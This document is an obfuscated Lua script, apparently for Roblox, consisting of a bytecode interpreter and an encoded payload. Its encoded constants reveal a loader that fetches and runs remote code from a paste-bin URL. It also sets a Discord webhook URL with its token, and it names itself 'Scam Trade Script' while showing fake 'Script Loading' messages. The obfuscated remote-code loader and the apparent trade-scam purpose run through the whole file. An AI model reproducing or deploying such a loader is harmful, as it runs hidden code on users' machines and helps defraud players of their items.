--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v84=v2(v0(v30,16));if v19 then local v91=0;local v92;while true do if (v91==1) then return v92;end if (0==v91) then v92=v5(v84,v19);v19=nil;v91=1;end end else return v84;end end end);local function v20(v31,v32,v33)if v33 then local v85=0;local v86;while true do if (v85==(0 -0)) then v86=(v31/(2^(v32-(2 -1))))%(((880 -(282 + 595)) -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v86-(v86%(569 -(367 + (1838 -(1523 + 114))))) ;end end else local v87=(2 + 0)^(v32-(928 -(214 + (1015 -302)))) ;return (((v31%(v87 + v87))>=v87) and (1 + 0)) or (0 + 0) ;end end local function v21()local v34=0;local v35;while true do if (v34==(1065 -((185 -(32 + 85)) + 978 + 19))) then v35=v1(v16,v18,v18);v18=v18 + ((282 + 989) -(226 + 1044)) ;v34=4 -3 ;end if (v34==1) then return v35;end end end local function v22()local v36=180 -(67 + 113) ;local v37;local v38;while true do if (v36==(958 -(892 + 65))) then return (v38 * 256) + v37 ;end if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (3 -1) );v18=v18 + (3 -1) ;v36=(258 + 93) -(87 + 263) ;end end end local function v23()local v39,v40,v41,v42=v1(v16,v18,v18 + (7 -4) );v18=v18 + 3 + 1 ;return (v42 * (66680831 -49903615)) + (v41 * (66488 -(802 + (272 -122)))) + (v40 * (689 -433)) + v39 ;end local function v24()local v43=v23();local v44=v23();local v45=1 + 0 ;local v46=(v20(v44,998 -(915 + 82) ,20) * (((1081 -(1020 + 60)) + 1)^(56 -(113 -89)))) + v43 ;local v47=v20(v44,(1882 -(630 + 793)) -(145 + 293) ,(35 + 52) -56 );local v48=((v20(v44,19 + 13 )==(1 -0)) and  -(1 + 0)) or (1188 -(1069 + 118)) ;if (v47==((0 -0) -0)) then if (v46==(0 -0)) then return v48 * ((0 -0) + (1747 -(760 + 987))) ;else v47=1 + 0 ;v45=(1913 -(1789 + 124)) -0 ;end elseif (v47==(2031 + 16)) then return ((v46==(791 -((1134 -(745 + 21)) + 423))) and (v48 * ((3 -2)/(0 + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(362 + 661) ) * (v45 + (v46/((20 -(10 + 8))^(199 -147)))) ;end local function v25(v49)local v50;if  not v49 then v49=v23();if (v49==0) then return "";end end v50=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;local v51={};for v68=2 -1 , #v50 do v51[v68]=v2(v1(v3(v50,v68,v68)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=194 -(26 + 168) ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if ((1463 -(1404 + 59))==v52) then v53=0 -0 ;v54=nil;v52=1 -0 ;end if (v52==(767 -(468 + 297))) then v57=nil;v58=nil;v52=881 -(284 + 594) ;end if ((1 -0)~=v52) then else v55=nil;v56=nil;v52=5 -3 ;end if (4==v52) then v61=nil;while true do if (v53~=(168 -(122 + 44))) then else v58=nil;v59=nil;v53=5 -2 ;end if (v53==(0 -0)) then v54=0 -0 ;v55=nil;v53=1;end if (v53==(1 + 2)) then local v97=0;while true do if (v97==(1 + 0)) then v53=4;break;end if (v97==(0 + 0)) then v60=nil;v61=nil;v97=1;end end end if (v53~=(1 + 0)) then else local v98=0 -0 ;while true do if (v98==(65 -(30 + 35))) then v56=nil;v57=nil;v98=2 -1 ;end if (v98~=(1 + 0)) then else v53=1 + 1 ;break;end end end if (v53~=(1261 -(1043 + 214))) then else while true do if (v54~=(3 + 0)) then else v61=nil;while true do local v103=0 -0 ;local v104;local v105;while true do if (v103==(1213 -(323 + 889))) then while true do if (v104==(0 -0)) then v105=0 + 0 ;while true do if (v105==(0 -0)) then local v194=580 -(361 + 219) ;while true do if (v194==(0 -0)) then if (v55~=2) then else local v197=320 -(53 + 267) ;local v198;while true do if ((0 + 0)~=v197) then else v198=0;while true do if (v198~=(414 -(15 + 398))) then else return v59;end if (v198==0) then for v208=2 -1 ,v23() do local v209=0;local v210;local v211;local v212;local v213;while true do if (v209==(984 -(18 + 964))) then while true do if (v210~=(849 -(254 + 595))) then else local v224=0 -0 ;while true do if ((0 -0)==v224) then v211=1790 -(573 + 1217) ;v212=nil;v224=1 + 0 ;end if (v224~=1) then else v210=1 + 0 ;break;end end end if (v210~=(1 + 0)) then else v213=nil;while true do if (v211==(851 -(20 + 830))) then while true do if (v212==(0 -0)) then v213=v21();if (v20(v213,940 -(714 + 225) ,1 + 0 )==(0 -0)) then local v232=0;local v233;local v234;local v235;local v236;local v237;while true do if (0==v232) then v233=126 -(116 + 10) ;v234=nil;v232=1 + 0 ;end if (v232~=(808 -(118 + 688))) then else v237=nil;while true do if (v233==(50 -(25 + 23))) then while true do if (v234==1) then v237={v22(),v22(),nil,nil};if (v235==(0 + 0)) then local v242=0 + 0 ;local v243;local v244;while true do if (v242==(1887 -(927 + 959))) then while true do if (v243~=0) then else v244=0;while true do if (v244~=(0 -0)) then else v237[735 -(16 + 716) ]=v22();v237[2 + 2 ]=v22();break;end end break;end end break;end if (v242==0) then v243=0;v244=nil;v242=2 -1 ;end end elseif (v235==(2 -1)) then v237[3]=v23();elseif (v235==(1553 -(1126 + 425))) then v237[6 -3 ]=v23() -((287 -(175 + 110))^(39 -23)) ;elseif (v235==(408 -(118 + 287))) then local v253=0 -0 ;local v254;local v255;while true do if (v253==(1122 -(118 + 1003))) then while true do if (v254==(0 + 0)) then v255=1061 -(810 + 251) ;while true do if (v255~=0) then else v237[8 -5 ]=v23() -((379 -(142 + 235))^16) ;v237[4]=v22();break;end end break;end end break;end if (v253~=0) then else v254=0 -0 ;v255=nil;v253=1;end end end v234=1 + 1 ;end if (v234==(979 -(553 + 424))) then local v239=0;while true do if (v239==(0 -0)) then if (v20(v236,1 -0 ,1 + 0 )==(1 + 0)) then v237[2]=v61[v237[2 -0 ]];end if (v20(v236,1 + 1 ,2 + 0 )~=(406 -(255 + 150))) then else v237[3]=v61[v237[3 + 0 ]];end v239=1 + 0 ;end if (v239~=(1 + 0)) then else v234=3;break;end end end if ((0 -0)==v234) then local v240=0;while true do if (v240~=(2 -1)) then else v234=2 -1 ;break;end if (v240==(0 + 0)) then v235=v20(v213,2,14 -11 );v236=v20(v213,4,759 -(239 + 514) );v240=1 + 0 ;end end end if (v234==(1332 -(797 + 532))) then if (v20(v236,1742 -(404 + 1335) ,3 + 0 )~=(1 + 0)) then else v237[9 -5 ]=v61[v237[3 + 1 ]];end v56[v208]=v237;break;end end break;end if (v233==(1 + 0)) then v236=nil;v237=nil;v233=339 -(10 + 327) ;end if (v233==0) then v234=0;v235=nil;v233=1203 -(373 + 829) ;end end break;end if ((732 -(476 + 255))==v232) then v235=nil;v236=nil;v232=340 -(118 + 220) ;end end end break;end end break;end if ((1130 -(369 + 761))==v211) then local v225=0 + 0 ;local v226;while true do if ((0 -0)==v225) then v226=449 -(108 + 341) ;while true do if (v226~=1) then else v211=1 -0 ;break;end if ((238 -(64 + 174))==v226) then local v238=0 + 0 ;while true do if (v238==(0 -0)) then v212=0 -0 ;v213=nil;v238=1494 -(711 + 782) ;end if (v238~=(337 -(144 + 192))) then else v226=1;break;end end end end break;end end end end break;end end break;end if (v209==(216 -(42 + 174))) then v210=0 + 0 ;v211=nil;v209=1 + 0 ;end if (v209~=(1 + 0)) then else v212=nil;v213=nil;v209=5 -3 ;end end end for v214=1 + 0 ,v23() do v57[v214-1 ]=v28();end v198=1 + 0 ;end end break;end end end if (v55==(1505 -(363 + 1141))) then local v199=0;local v200;while true do if ((1580 -(1183 + 397))==v199) then v200=0 + 0 ;while true do if (v200==1) then local v204=0;while true do if (v204==(2 -1)) then v200=2;break;end if (v204~=(0 + 0)) then else for v217=1 + 0 ,v60 do local v218=0 + 0 ;local v219;local v220;local v221;local v222;while true do if (v218==(1977 -(1913 + 62))) then while true do if (v219==(0 + 0)) then local v227=1790 -(1010 + 780) ;while true do if (v227~=(2 -1)) then else v219=1;break;end if (v227~=(1933 -(565 + 1368))) then else v220=0 -0 ;v221=nil;v227=1;end end end if (v219==(4 -3)) then v222=nil;while true do if (v220==(1661 -(1477 + 184))) then local v228=0;local v229;local v230;while true do if (v228==(1 -0)) then while true do if (v229==0) then v230=1836 -(1045 + 791) ;while true do if (v230==(0 -0)) then v221=v21();v222=nil;v230=1 -0 ;end if ((1 + 0)==v230) then v220=1;break;end end break;end end break;end if (v228==(856 -(564 + 292))) then v229=0 -0 ;v230=nil;v228=2 -1 ;end end end if ((305 -(244 + 60))==v220) then if (v221==1) then v222=v21()~=(0 + 0) ;elseif (v221==(478 -(41 + 435))) then v222=v24();elseif (v221~=3) then else v222=v25();end v61[v217]=v222;break;end end break;end end break;end if ((1001 -(938 + 63))~=v218) then else v219=1574 -(1281 + 293) ;v220=nil;v218=1 + 0 ;end if (v218==(267 -(28 + 238))) then v221=nil;v222=nil;v218=2;end end end v59[1128 -(936 + 189) ]=v21();v204=1;end end end if (v200==(0 + 0)) then local v205=1613 -(1565 + 48) ;local v206;while true do if (v205~=(0 -0)) then else v206=0 + 0 ;while true do if (v206==0) then local v223=1138 -(782 + 356) ;while true do if (v223==(267 -(176 + 91))) then v60=v23();v61={};v223=2 -1 ;end if (v223~=(1 + 0)) then else v206=1;break;end end end if ((1 + 0)~=v206) then else v200=3 -2 ;break;end end break;end end end if (v200==(2 + 0)) then v55=472 -(381 + 89) ;break;end end break;end end end v194=1 + 0 ;end if (v194~=(1 -0)) then else v105=1 -0 ;break;end end end if ((1093 -(975 + 117))~=v105) then else if (v55==(0 -0)) then local v195=1784 -(214 + 1570) ;local v196;while true do if (v195==(1455 -(990 + 465))) then v196=0 + 0 ;while true do if (v196==(1876 -(157 + 1718))) then local v201=0 + 0 ;local v202;while true do if (v201~=0) then else v202=0;while true do if ((1 + 0)==v202) then v196=6 -4 ;break;end if (v202==(0 -0)) then v58={};v59={v56,v57,nil,v58};v202=1;end end break;end end end if (v196==(3 -1)) then v55=2 -1 ;break;end if (v196==0) then local v203=0 + 0 ;while true do if ((1 + 0)==v203) then v196=1 -0 ;break;end if (v203~=(0 -0)) then else local v207=0 + 0 ;while true do if (v207==(0 -0)) then v56={};v57={};v207=1228 -(322 + 905) ;end if (v207==(612 -(602 + 9))) then v203=1;break;end end end end end end break;end end end break;end end break;end end break;end if (v103~=(1189 -(449 + 740))) then else v104=0;v105=nil;v103=873 -(826 + 46) ;end end end break;end if (v54~=(827 -(802 + 24))) then else local v99=947 -(245 + 702) ;local v100;while true do if (v99==(0 -0)) then v100=0 -0 ;while true do if (v100==0) then local v189=0 + 0 ;while true do if (v189~=(1 + 0)) then else v100=1899 -(260 + 1638) ;break;end if (v189~=0) then else v57=nil;v58=nil;v189=441 -(382 + 58) ;end end end if (v100~=(1 + 0)) then else v54=2;break;end end break;end end end if ((0 -0)~=v54) then else local v101=0;while true do if ((1 + 0)==v101) then v54=1;break;end if (v101~=(0 -0)) then else v55=0;v56=nil;v101=2 -1 ;end end end if (v54~=(1207 -(902 + 303))) then else local v102=0 -0 ;while true do if (v102==(0 -0)) then v59=nil;v60=nil;v102=1 + 0 ;end if (v102~=(1 + 0)) then else v54=1693 -(1121 + 569) ;break;end end end end break;end end break;end if (v52~=(217 -(22 + 192))) then else v59=nil;v60=nil;v52=4;end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v70=v65;local v71=v66;local v72=v67;local v73=v27;local v74=1;local v75= -1;local v76={};local v77={...};local v78=v12("#",...) -1 ;local v79={};local v80={};for v88=0,v78 do if (v88>=v72) then v76[v88-v72 ]=v77[v88 + 1 ];else v80[v88]=v77[v88 + 1 ];end end local v81=(v78-v72) + 1 ;local v82;local v83;while true do v82=v70[v74];v83=v82[1];if (v83<=8) then if (v83<=3) then if (v83<=1) then if (v83>0) then v80[v82[2]][v82[3]]=v82[4];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v64[v82[3]];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]][v82[3]]=v82[4];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v74=v82[3];else local v112=0;local v113;local v114;local v115;local v116;local v117;while true do if (v112==2) then v116=v80[v82[3]];v80[v117 + 1 ]=v116;v80[v117]=v116[v82[4]];v74=v74 + 1 ;v112=3;end if (v112==1) then v80[v82[2]]=v64[v82[3]];v74=v74 + 1 ;v82=v70[v74];v117=v82[2];v112=2;end if (v112==4) then v80[v82[2]]=v82[3]~=0 ;v74=v74 + 1 ;v82=v70[v74];v117=v82[2];v112=5;end if (v112==5) then v114,v115=v73(v80[v117](v13(v80,v117 + 1 ,v82[3])));v75=(v115 + v117) -1 ;v113=0;for v184=v117,v75 do local v185=0;while true do if (0==v185) then v113=v113 + 1 ;v80[v184]=v114[v113];break;end end end v112=6;end if (v112==8) then v82=v70[v74];v74=v82[3];break;end if (v112==3) then v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v112=4;end if (v112==7) then v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]();v74=v74 + 1 ;v112=8;end if (v112==6) then v74=v74 + 1 ;v82=v70[v74];v117=v82[2];v80[v117]=v80[v117](v13(v80,v117 + 1 ,v75));v112=7;end if (0==v112) then v113=nil;v114,v115=nil;v116=nil;v117=nil;v112=1;end end end elseif (v83>2) then v74=v82[3];elseif (v82[2]==v80[v82[4]]) then v74=v74 + 1 ;else v74=v82[3];end elseif (v83<=5) then if (v83==4) then v80[v82[2]]=v64[v82[3]];else v80[v82[2]]=v82[3]~=0 ;end elseif (v83<=6) then local v122=0;local v123;local v124;local v125;local v126;while true do if (v122==0) then v123=v82[2];v124,v125=v73(v80[v123](v13(v80,v123 + 1 ,v82[3])));v122=1;end if (1==v122) then v75=(v125 + v123) -1 ;v126=0;v122=2;end if (v122==2) then for v186=v123,v75 do local v187=0;while true do if (0==v187) then v126=v126 + 1 ;v80[v186]=v124[v126];break;end end end break;end end elseif (v83>7) then if (v80[v82[2]]==v82[4]) then v74=v74 + 1 ;else v74=v82[3];end else do return;end end elseif (v83<=12) then if (v83<=10) then if (v83>9) then v64[v82[3]]=v80[v82[2]];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v64[v82[3]]=v80[v82[2]];v74=v74 + 1 ;v82=v70[v74];v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v74=v82[3];else v80[v82[2]][v82[3]]=v82[4];end elseif (v83>11) then for v143=v82[2],v82[3] do v80[v143]=nil;end else local v133=v82[2];local v134=v80[v82[3]];v80[v133 + 1 ]=v134;v80[v133]=v134[v82[4]];end elseif (v83<=14) then if (v83>13) then local v138=0;while true do if (v138==1) then v80[v82[2]]=v64[v82[3]];v74=v74 + 1 ;v82=v70[v74];v138=2;end if (v138==2) then v80[v82[2]][v82[3]]=v82[4];v74=v74 + 1 ;v82=v70[v74];v138=3;end if (v138==4) then v74=v82[3];break;end if (v138==0) then v80[v82[2]][v82[3]]=v82[4];v74=v74 + 1 ;v82=v70[v74];v138=1;end if (v138==3) then v80[v82[2]]=v82[3];v74=v74 + 1 ;v82=v70[v74];v138=4;end end else local v139=0;local v140;while true do if (v139==0) then v140=v82[2];v80[v140]=v80[v140](v13(v80,v140 + 1 ,v75));break;end end end elseif (v83<=15) then v80[v82[2]]=v82[3];elseif (v83>16) then v80[v82[2]]();else v64[v82[3]]=v80[v82[2]];end v74=v74 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!1A3O00028O00026O000840026O00F03F026O00104003023O005F4703093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E030B3O0057616974696E6754696D65025O00C07240030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403203O00682O7470733A2O2F70617374652D62696E2E78797A2F7261772F39382O34373403083O00557365724E616D6503093O00482O754B686F69303903093O00557365724E616D6532030B3O0047616D655F476F642O3032027O004003093O00466972737454657874030D3O00506C6561736520776169742O2E030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F312O3031353039343832373538363O3832382F4763696C7A6E53586A53356B422O735339376146507564703547666142316953664861715A726455364D2D64632D36487379472O48357253315172413441757364485651030A3O005363726970744E616D6503113O005363616D2054726164652053637269707400503O00120F3O00014O000C000100013O000E020001000200013O0004033O0002000100120F000100013O00260800010014000100020004033O0014000100120F000200013O0026080002000C000100030004033O000C000100120F000100043O0004033O0014000100260800020008000100010004033O00080001001204000300053O00300E00030006000700122O000300053O00302O00030008000900122O000200033O00044O000800010026080001001F000100040004033O001F00010012040002000A3O00122O0003000B3O00202O00030003000C00122O0005000D6O000600016O000300066O00023O00024O00020001000100044O004F00010026080001002E000100010004033O002E000100120F000200013O00260800020026000100030004033O0026000100120F000100033O0004033O002E0001000E0200010022000100020004033O0022000100120F0003000F3O00120A0003000E3O00122O000300113O00122O000300103O00122O000200033O00044O002200010026080001003D000100120004033O003D000100120F000200013O00260800020035000100030004033O0035000100120F000100023O0004033O003D000100260800020031000100010004033O00310001001204000300053O00300E00030013001400122O000300053O00302O00030015001600122O000200033O00044O0031000100260800010005000100030004033O0005000100120F000200013O00260800020047000100010004033O0047000100120F000300183O001210000300173O001204000300053O00300900030019001A00120F000200033O00260800020040000100030004033O0040000100120F000100123O0004033O000500010004033O004000010004033O000500010004033O004F00010004033O000200012O00073O00017O00",v9(),...);end
